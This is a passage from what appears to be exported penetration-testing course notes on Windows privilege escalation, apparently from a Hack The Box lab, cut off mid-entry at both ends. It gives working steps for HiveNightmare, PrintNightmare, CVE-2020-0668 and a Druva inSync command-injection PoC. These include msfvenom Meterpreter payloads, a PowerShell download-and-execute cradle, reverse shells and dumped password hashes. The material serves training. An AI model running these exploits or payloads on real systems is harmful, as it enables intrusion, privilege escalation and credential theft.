attacker could leverage this to create a hard link to a file that the attacker controls. The exploit for this flaw used the [SchRpcSetSecurity](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/a8172c11-a24a-4ad9-abd0-82bcf29d794d?redirectedfrom=MSDN) API function to call a print job using the XPS printer and hijack the DLL as NT AUTHORITY\\SYSTEM via the Spooler service. An in-depth writeup is available [here](https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html). The Hack The Box box [Hackback](https://snowscan.io/htb-writeup-hackback/) can be used to try out this privilege escalation exploit.\n\nSummer of 2021 revealed a treasure trove of new Windows and Active Directory-related remote code execution and local privilege escalation flaws to the delight of penetration testers (and real-world attackers), and I'm sure groans from our hard-working colleagues on the defense side of things.\n\n`CVE-2021-36934 HiveNightmare, aka SeriousSam` is a Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level. Researchers quickly developed a PoC exploit to allow reading of the SAM, SYSTEM, and SECURITY registry hives and create copies of them to process offline later and extract password hashes (including local admin) using a tool such as SecretsDump.py. More information about this flaw can be found [here](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5) and [this](https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe) exploit binary can be used to create copies of the three files to our working directory. This [script](https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1) can be used to detect the flaw and also fix the ACL issue. Let's take a look.\n\n#### Checking Permissions on the SAM File\n\nWe can check for this vulnerability using `icacls` to check permissions on the SAM file. In our case, we have a vulnerable version as the file is readable by the `BUILTIN\\Users` group.\n\nKernel Exploits\n\n```cmd-session\nC:\\htb> icacls c:\\Windows\\System32\\config\\SAM\n\nC:\\Windows\\System32\\config\\SAM BUILTIN\\Administrators:(I)(F)\n                               NT AUTHORITY\\SYSTEM:(I)(F)\n                               BUILTIN\\Users:(I)(RX)\n                               APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)\n                               APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)\n\nSuccessfully processed 1 files; Failed processing 0 files\n```\n\nSuccessful exploitation also requires the presence of one or more shadow copies. Most Windows 10 systems will have `System Protection` enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw.\n\n#### Performing Attack and Parsing Password Hashes\n\nThis [PoC](https://github.com/GossiTheDog/HiveNightmare) can be used to perform the attack, creating copies of the aforementioned registry hives:\n\nKernel Exploits\n\n```powershell-session\nPS C:\\Users\\htb-student\\Desktop> .\\HiveNightmare.exe\n\nHiveNightmare v0.6 - dump registry hives as non-admin users\n\nSpecify maximum number of shadows to inspect with parameter if wanted, default is 15.\n\nRunning...\n\nNewer file found: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\n\nSuccess: SAM hive from 2021-08-07 written out to current working directory as SAM-2021-08-07\n\nNewer file found: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY\n\nSuccess: SECURITY hive from 2021-08-07 written out to current working directory as SECURITY-2021-08-07\n\nNewer file found: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM\n\nSuccess: SYSTEM hive from 2021-08-07 written out to current working directory as SYSTEM-2021-08-07\n\n\nAssuming no errors above, you should be able to find hive dump files in current working directory.\n```\n\nThese copies can then be transferred back to the attack host, where impacket-secretsdump is used to extract the hashes:\n\nKernel Exploits\n\n```shell-session\ndrxh3kr@htb[/htb]$ impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local\n\nImpacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra\n\n[*] Target system bootKey: 0xebb2121de07ed08fc7dc58aa773b23d6\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c93428723187f868ae2f99d4fa66dceb:::\nmrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::\nhtb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::\n[*] Dumping cached domain logon information (domain/username:hash)\n[*] Dumping LSA Secrets\n[*] DPAPI_SYSTEM \ndpapi_machinekey:0x3c7b7e66890fb2181a74bb56ab12195f248e9461\ndpapi_userkey:0xc3e6491e75d7cffe8efd40df94d83cba51832a56\n[*] NL$KM \n 0000   45 C5 B2 32 29 8B 05 B8  E7 E7 E0 4B 2C 14 83 02   E..2)......K,...\n 0010   CE 2F E7 D9 B8 E0 F0 F8  20 C8 E4 70 DD D1 7F 4F   ./...... ..p...O\n 0020   42 2C E6 9E AF 57 74 01  09 88 B3 78 17 3F 88 54   B,...Wt....x.?.T\n 0030   52 8F 8D 9C 06 36 C0 24  43 B9 D8 0F 35 88 B9 60   R....6.$C...5..`\nNL$KM:45c5b232298b05b8e7e7e04b2c148302ce2fe7d9b8e0f0f820c8e470ddd17f4f422ce69eaf5774010988b378173f8854528f8d9c0636c02443b9d80f3588b960\n```\n\n`CVE-2021-1675/CVE-2021-34527 PrintNightmare` is a flaw in [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) which is used to allow for remote printing and driver installation. This function is intended to give users with the Windows privilege `SeLoadDriverPrivilege` the ability to add drivers to a remote Print Spooler. This right is typically reserved for users in the built-in Administrators group and Print Operators who may have a legitimate need to install a printer driver on an end user's machine remotely. The flaw allowed any authenticated user to add a print driver to a Windows system without having the privilege mentioned above, allowing an attacker full remote code execution as SYSTEM on any affected system. The flaw affects every supported version of Windows, and being that the Print Spooler runs by default on Domain Controllers, Windows 7 and 10, and is often enabled on Windows servers, this presents a massive attack surface, hence \"nightmare.\" Microsoft initially released a patch that did not fix the issue (and early guidance was to disable the Spooler service, which is not practical for many organizations) but released a second [patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) in July of 2021 along with guidance to check that specific registry settings are either set to `0` or not defined. Once this vulnerability was made public, PoC exploits were released rather quickly. [This](https://github.com/cube0x0/CVE-2021-1675) version by [@cube0x0](https://twitter.com/cube0x0) can be used to execute a malicious DLL remotely or locally using a modified version of Impacket. The repo also contains a C# implementation. This [PowerShell implementation](https://github.com/calebstewart/CVE-2021-1675) can be used for quick local privilege escalation. By default, this script adds a new local admin user, but we can also supply a custom DLL to obtain a reverse shell or similar if adding a local admin user is not in scope.\n\n#### Checking for Spooler Service\n\nWe can quickly check if the Spooler service is running with the following command. If it is not running, we will receive a \"path does not exist\" error.\n\nKernel Exploits\n\n```powershell-session\nPS C:\\htb> ls \\\\localhost\\pipe\\spoolss\n\n\n    Directory: \\\\localhost\\pipe\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n                                                  spoolss\n```\n\n#### Adding Local Admin with PrintNightmare PowerShell PoC\n\nFirst start by [bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) the execution policy on the target host:\n\nKernel Exploits\n\n```powershell-session\nPS C:\\htb> Set-ExecutionPolicy Bypass -Scope Process\n\nExecution Policy Change\nThe execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose\nyou to the security risks described in the about_Execution_Policies help topic at\nhttps:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?\n[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is \"N\"): A\n```\n\nNow we can import the PowerShell script and use it to add a new local admin user.\n\nKernel Exploits\n\n```powershell-session\nPS C:\\htb> Import-Module .\\CVE-2021-1675.ps1\nPS C:\\htb> Invoke-Nightmare -NewUser \"hacker\" -NewPassword \"Pwnd1234!\" -DriverName \"PrintIt\"\n\n[+] created payload at C:\\Users\\htb-student\\AppData\\Local\\Temp\\nightmare.dll\n[+] using pDriverPath = \"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_am\nd64_ce3301b66255a0fb\\Amd64\\mxdwdrv.dll\"\n[+] added user hacker as local administrator\n[+] deleting payload from C:\\Users\\htb-student\\AppData\\Local\\Temp\\nightmare.dll\n```\n\n#### Confirming New Admin User\n\nIf all went to plan, we will have a new local admin user under our control. Adding a user is \"noisy,\" We would not want to do this on an engagement where stealth is a consideration. Furthermore, we would want to check with our client to ensure account creation is in scope for the assessment.\n\nKernel Exploits\n\n```powershell-session\nPS C:\\htb> net user hacker\n\nUser name                    hacker\nFull Name                    hacker\nComment                      \nUser's comment               \nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            ?8/?9/?2021 12:12:01 PM\nPassword expires             Never\nPassword changeable          ?8/?9/?2021 12:12:01 PM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script                 \nUser profile                 \nHome directory               \nLast logon                   Never\n\nLogon hours allowed          All\n\nLocal Group Memberships      *Administrators       \nGlobal Group memberships     *None                 \nThe command completed successfully.\n```\n\nThis is a small sampling of some of the highest impact vulnerabilities. While it is imperative for us to understand and be able to enumerate and exploit these vulnerabilities, it is also important to be able to detect and leverage lesser-known flaws.\n\n---\n\n## Enumerating Missing Patches\n\nThe first step is looking at installed updates and attempting to find updates that may have been missed, thus, opening up an attack path for us.\n\n#### Examining Installed Updates\n\nWe can examine the installed updates in several ways. Below are three separate commands we can use.\n\nKernel Exploits\n\n```powershell-session\nPS C:\\htb> systeminfo\nPS C:\\htb> wmic qfe list brief\nPS C:\\htb> Get-Hotfix\n```\n\n#### Viewing Installed Updates with WMI\n\nKernel Exploits\n\n```cmd-session\nC:\\htb> wmic qfe list brief\n\nDescription      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status\nUpdate                        KB4601056               NT AUTHORITY\\SYSTEM  3/27/2021                                    \nUpdate                        KB4513661                                    1/9/2020                                     \nSecurity Update               KB4516115                                    1/9/2020                                     \nUpdate                        KB4517245                                    1/9/2020                                     \nSecurity Update               KB4528759                                    1/9/2020                                     \nSecurity Update               KB4535680               NT AUTHORITY\\SYSTEM  3/27/2021                                    \nSecurity Update               KB4580325               NT AUTHORITY\\SYSTEM  3/27/2021                                    \nSecurity Update               KB5000908               NT AUTHORITY\\SYSTEM  3/27/2021                                    \nSecurity Update               KB5000808               NT AUTHORITY\\SYSTEM  3/27/2021                                    \n```\n\nWe can search for each KB (Microsoft Knowledge Base ID number) in the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808) to get a better idea of what fixes have been installed and how far behind the system may be on security updates. A search for `KB5000808` shows us that this is an update from March of 2021, which means the system is likely far behind on security updates.\n\n---\n\n## CVE-2020-0668 Example\n\nNext, let's exploit [Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/), which exploits an arbitrary file move vulnerability leveraging the Windows Service Tracing. Service Tracing allows users to troubleshoot issues with running services and modules by generating debug information. Its parameters are configurable using the Windows registry. Setting a custom MaxFileSize value that is smaller than the size of the file prompts the file to be renamed with a `.OLD` extension when the service is triggered. This move operation is performed by `NT AUTHORITY\\SYSTEM`, and can be abused to move a file of our choosing with the help of mount points and symbolic links.\n\n#### Checking Current User Privileges\n\nLet's verify our current user's privileges.\n\nKernel Exploits\n\n```cmd-session\nC:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled\nSeUndockPrivilege             Remove computer from docking station Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\nSeTimeZonePrivilege           Change the time zone                 Disabled\n```\n\n#### After Building Solution\n\nWe can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.\n\nKernel Exploits\n\n```shell-session\nCVE-2020-0668.exe\nCVE-2020-0668.exe.config\nCVE-2020-0668.pdb\nNtApiDotNet.dll\nNtApiDotNet.xml\n```\n\nAt this point, we can use the exploit to create a file of our choosing in a protected folder such as C:\\Windows\\System32. We aren't able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.\n\nWe can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below.\n\n- `C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe`\n\n#### Checking Permissions on Binary\n\n`icacls` confirms that we only have read and execute permissions on this binary based on the line `BUILTIN\\Users:(I)(RX)` in the command output.\n\nKernel Exploits\n\n```cmd-session\nC:\\htb> icacls \"c:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe\"\n\nC:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe NT AUTHORITY\\SYSTEM:(I)(F)\n                                                                          BUILTIN\\Administrators:(I)(F)\n                                                                          BUILTIN\\Users:(I)(RX)\n                                                                          APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)\n                                                                          APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)\n \nSuccessfully processed 1 files; Failed processing 0 files\n```\n\n#### Generating Malicious Binary\n\nLet's generate a malicious `maintenanceservice.exe` binary that can be used to obtain a Meterpreter reverse shell connection from our target.\n\nKernel Exploits\n\n```shell-session\ndrxh3kr@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 645 bytes\nFinal size of exe file: 7168 bytes\n```\n\n#### Hosting the Malicious Binary\n\nWe can download it to the target using cURL after starting a Python HTTP server on our attack host like in the `User Account Control` section previously. We can also use wget from the target.\n\nKernel Exploits\n\n```shell-session\ndrxh3kr@htb[/htb]$ $ python3 -m http.server 8080\n\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n10.129.43.13 - - [01/Mar/2022 18:17:26] \"GET /maintenanceservice.exe HTTP/1.1\" 200 -\n10.129.43.13 - - [01/Mar/2022 18:17:45] \"GET /maintenanceservice.exe HTTP/1.1\" 200 -\n```\n\n#### Downloading the Malicious Binary\n\nFor this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.\n\nWe need to do this because running the exploit corrupts the malicious version of `maintenanceservice.exe` that is moved to (our copy in `c:\\Users\\htb-student\\Desktop` that we are targeting) `c:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe` which we will need to account for later. If we attempt to utilize the copied version, we will receive a `system error 216` because the .exe file is no longer a valid binary.\n\nKernel Exploits\n\n```powershell-session\nPS C:\\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe\nPS C:\\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe\n```\n\n#### Running the Exploit\n\nNext, let's run the exploit. It accepts two arguments, the source and destination files.\n\nKernel Exploits\n\n```cmd-session\nC:\\htb> C:\\Tools\\CVE-2020-0668\\CVE-2020-0668.exe C:\\Users\\htb-student\\Desktop\\maintenanceservice.exe \"C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe\"                                       \n\n[+] Moving C:\\Users\\htb-student\\Desktop\\maintenanceservice.exe to C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe\n\n[+] Mounting \\RPC Control onto C:\\Users\\htb-student\\AppData\\Local\\Temp\\nzrghuxz.leo\n[+] Creating symbol links\n[+] Updating the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\RASPLAP configuration.\n[+] Sleeping for 5 seconds so the changes take effect\n[+] Writing phonebook file to C:\\Users\\htb-student\\AppData\\Local\\Temp\\179739c5-5060-4088-a3e7-57c7e83a0828.pbk\n[+] Cleaning up\n[+] Done!\n```\n\n#### Checking Permissions of New File\n\nThe exploit runs and executing `icacls` again shows the following entry for our user: `WINLPE-WS02\\htb-student:(F)`. This means that our htb-student user has full control over the maintenanceservice.exe binary, and we can overwrite it with a non-corrupted version of our malicious binary.\n\nKernel Exploits\n\n```cmd-session\nC:\\htb> icacls 'C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe'\n\nC:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe NT AUTHORITY\\SYSTEM:(F)\n                                                                          BUILTIN\\Administrators:(F)\n                                                                          WINLPE-WS02\\htb-student:(F)\n```\n\n#### Replacing File with Malicious Binary\n\nWe can overwrite the `maintenanceservice.exe` binary in `c:\\Program Files (x86)\\Mozilla Maintenance Service` with a good working copy of our malicious binary created earlier before proceeding to start the service. In this example, we downloaded two copies of the malicious binary to `C:\\Users\\htb-student\\Desktop`, `maintenanceservice.exe` and `maintenanceservice2.exe`. Let's move the good copy that was not corrupted by the exploit `maintenanceservice2.exe` to the Program Files directory, making sure to rename the file properly and remove the `2` or the service won't start. The `copy` command will only work from a cmd.exe window, not a PowerShell console.\n\nKernel Exploits\n\n```cmd-session\nC:\\htb> copy /Y C:\\Users\\htb-student\\Desktop\\maintenanceservice2.exe \"c:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe\"\n\n        1 file(s) copied.\n\n```\n\n#### Metasploit Resource Script\n\nNext, save the below commands to a [Resource Script](https://docs.rapid7.com/metasploit/resource-scripts/) file named `handler.rc`.\n\nKernel Exploits\n\n```shell-session\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_https\nset LHOST <our_ip>\nset LPORT 8443\nexploit\n```\n\n#### Launching Metasploit with Resource Script\n\nLaunch Metasploit using the Resource Script file to preload our settings.\n\nKernel Exploits\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo msfconsole -r handler.rc \n                                                 \n\n         .                                         .\n .\n\n      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o\n       '   dB'                     BBP\n    dB'dB'dB' dBBP     dBP     dBP BB\n   dB'dB'dB' dBP      dBP     dBP  BB\n  dB'dB'dB' dBBBBP   dBP     dBBBBBBB\n\n                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP\n          .                  .                  dB' dBP    dB'.BP\n                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP\n                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP\n                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP\n\n                                                                    .\n                .\n        o                  To boldly go where no\n                            shell has gone before\n\n\n       =[ metasploit v6.0.9-dev                           ]\n+ -- --=[ 2069 exploits - 1123 auxiliary - 352 post       ]\n+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]\n+ -- --=[ 7 evasion                                       ]\n\nMetasploit tip: Use the resource command to run commands from a file\n\n[*] Processing handler.rc for ERB directives.\nresource (handler.rc)> use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nresource (handler.rc)> set PAYLOAD windows/x64/meterpreter/reverse_https\nPAYLOAD => windows/x64/meterpreter/reverse_https\nresource (handler.rc)> set LHOST 10.10.14.3\nLHOST => 10.10.14.3\nresource (handler.rc)> set LPORT 8443\nLPORT => 8443\nresource (handler.rc)> exploit\n[*] Started HTTPS reverse handler on https://10.10.14.3:8443\n```\n\n#### Starting the Service\n\nStart the service, and we should get a session as `NT AUTHORITY\\SYSTEM`.\n\nKernel Exploits\n\n```cmd-session\nC:\\htb> net start MozillaMaintenance \n\nThe service is not responding to the control function\n\nMore help is available by typing NET HELPMSG 2186\n```\n\n#### Receiving a Meterpreter Session\n\nWe will get an error trying to start the service but will still receive a callback once the Meterpreter binary executes.\n\nKernel Exploits\n\n```shell-session\n[*] Started HTTPS reverse handler on https://10.10.14.3:8443\n[*] https://10.10.14.3:8443 handling request from 10.129.43.13; (UUID: syyuxztc) Staging x64 payload (201308 bytes) ...\n[*] Meterpreter session 1 opened (10.10.14.3:8443 -> 10.129.43.13:52047) at 2021-05-14 13:38:55 -0400\n\n\nmeterpreter > getuid\n\nServer username: NT AUTHORITY\\SYSTEM\n\n\nmeterpreter > sysinfo\n\nComputer        : WINLPE-WS02\nOS              : Windows 10 (10.0 Build 18363).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 6\nMeterpreter     : x64/windows\n\n\nmeterpreter > hashdump\n\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::\nmrb3n:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c93428723187f868ae2f99d4fa66dceb:::\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/20-Vulnerable Services",
    "path": "02_CPTS/17-Windows Privilege Escalation/20-Vulnerable Services.md",
    "title": "20 Vulnerable Services",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Vulnerable Services --- We may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are...",
    "category": "02_CPTS",
    "content": "# Vulnerable Services\n\n---\n\nWe may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are used throughout the organization. It is common to encounter a multitude of different applications and services on Windows workstations during our assessments. Let's look at an instance of a vulnerable service that we could come across in a real-world environment. Some services/applications may allow us to escalate to SYSTEM. In contrast, others could cause a denial-of-service condition or allow access to sensitive data such as configuration files containing passwords.\n\n---\n\n#### Enumerating Installed Programs\n\nAs covered previously, let's start by enumerating installed applications to get a lay of the land.\n\nVulnerable Services\n\n```cmd-session\nC:\\htb> wmic product get name\n\nName\nMicrosoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910\nUpdate for Windows 10 for x64-based Systems (KB4023057)\nMicrosoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127\nVMware Tools\nDruva inSync 6.6.3\nMicrosoft Update Health Tools\nMicrosoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910\nUpdate for Windows 10 for x64-based Systems (KB4480730)\nMicrosoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127\n```\n\nThe output looks mostly standard for a Windows 10 workstation. However, the `Druva inSync` application stands out. A quick Google search shows that version `6.6.3` is vulnerable to a command injection attack via an exposed RPC service. We may be able to use [this](https://www.exploit-db.com/exploits/49211) exploit PoC to escalate our privileges. From this [blog post](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/) which details the initial discovery of the flaw, we can see that Druva inSync is an application used for “Integrated backup, eDiscovery, and compliance monitoring,” and the client application runs a service in the context of the powerful `NT AUTHORITY\\SYSTEM` account. Escalation is possible by interacting with a service running locally on port 6064.\n\n#### Enumerating Local Ports\n\nLet's do some further enumeration to confirm that the service is running as expected. A quick look with `netstat` shows a service running locally on port `6064`.\n\nVulnerable Services\n\n```cmd-session\nC:\\htb> netstat -ano | findstr 6064\n\n  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324\n  TCP    127.0.0.1:6064         127.0.0.1:50274        ESTABLISHED     3324\n  TCP    127.0.0.1:6064         127.0.0.1:50510        TIME_WAIT       0\n  TCP    127.0.0.1:6064         127.0.0.1:50511        TIME_WAIT       0\n  TCP    127.0.0.1:50274        127.0.0.1:6064         ESTABLISHED     3860\n```\n\n#### Enumerating Process ID\n\nNext, let's map the process ID (PID) `3324` back to the running process.\n\nVulnerable Services\n\n```powershell-session\nPS C:\\htb> get-process -Id 3324\n\nHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n    149      10     1512       6748              3324   0 inSyncCPHwnet64\n```\n\n#### Enumerating Running Service\n\nAt this point, we have enough information to determine that the Druva inSync application is indeed installed and running, but we can do one last check using the `Get-Service` cmdlet.\n\nVulnerable Services\n\n```powershell-session\nPS C:\\htb> get-service | ? {$_.DisplayName -like 'Druva*'}\n\nStatus   Name               DisplayName\n------   ----               -----------\nRunning  inSyncCPHService   Druva inSync Client Service\n```\n\n---\n\n## Druva inSync Windows Client Local Privilege Escalation Example\n\n#### Druva inSync PowerShell PoC\n\nWith this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.\n\nCode: powershell\n\n```powershell\n$ErrorActionPreference = \"Stop\"\n\n$cmd = \"net user pwnd /add\"\n\n$s = New-Object System.Net.Sockets.Socket(\n    [System.Net.Sockets.AddressFamily]::InterNetwork,\n    [System.Net.Sockets.SocketType]::Stream,\n    [System.Net.Sockets.ProtocolType]::Tcp\n)\n$s.Connect(\"127.0.0.1\", 6064)\n\n$header = [System.Text.Encoding]::UTF8.GetBytes(\"inSync PHC RPCW[v0002]\")\n$rpcType = [System.Text.Encoding]::UTF8.GetBytes(\"$([char]0x0005)`0`0`0\")\n$command = [System.Text.Encoding]::Unicode.GetBytes(\"C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd\");\n$length = [System.BitConverter]::GetBytes($command.Length);\n\n$s.Send($header)\n$s.Send($rpcType)\n$s.Send($length)\n$s.Send($command)\n```\n\n#### Modifying PowerShell PoC\n\nFor our purposes, we want to modify the `$cmd` variable to our desired command. We can do many things here, such as adding a local admin user (which is a bit noisy, and we want to avoid modifying things on client systems wherever possible) or sending ourselves a reverse shell. Let's try this with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Download the script to our attack box, and rename it something simple like `shell.ps1`. Open the file, and append the following at the bottom of the script file (changing the IP to match our address and listening port as well):\n\nVulnerable Services\n\n```shell-session\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443\n```\n\nModify the `$cmd` variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.\n\nCode: powershell\n\n```powershell\n$cmd = \"powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')\"\n```\n\n#### Starting a Python Web Server\n\nNext, start a Python web server in the same directory where our `shell.ps1` script resides.\n\nVulnerable Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 -m http.server 8080\n```\n\n#### Catching a SYSTEM Shell\n\nFinally, start a `Netcat` listener on the attack box and execute the PoC PowerShell script on the target host (after [modifying the PowerShell execution policy](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy) with a command such as `Set-ExecutionPolicy Bypass -Scope Process`). We will get a reverse shell connection back with `SYSTEM` privileges if all goes to plan.\n\nVulnerable Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -lvnp 9443\n\nlistening on [any] 9443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611\nWindows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\n\nPS C:\\WINDOWS\\system32>whoami\n\nnt authority\\system\n\n\nPS C:\\WINDOWS\\system32> hostname\n\nWINLPE-WS01\n```\n\n---\n\n## Moving On\n\nThis example shows just how risky it can be to allow users to install software on their machines and how we should always enumerate installed software if we land on a Windows server or desktop host. Organizations should restrict local administrator rights on end-user machines following the principle of least privilege. Furthermore, an application whitelisting tool can help ensure that only properly vetted software is installed on user workstations.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/21-DLL Injection",
    "path": "02_CPTS/17-Windows Privilege Escalation/21-DLL Injection.md",
    "title": "21 DLL Injection",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "DLL Injection DLL injection is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. This technique allows the inserted code to run with...",
    "category": "02_CPTS",
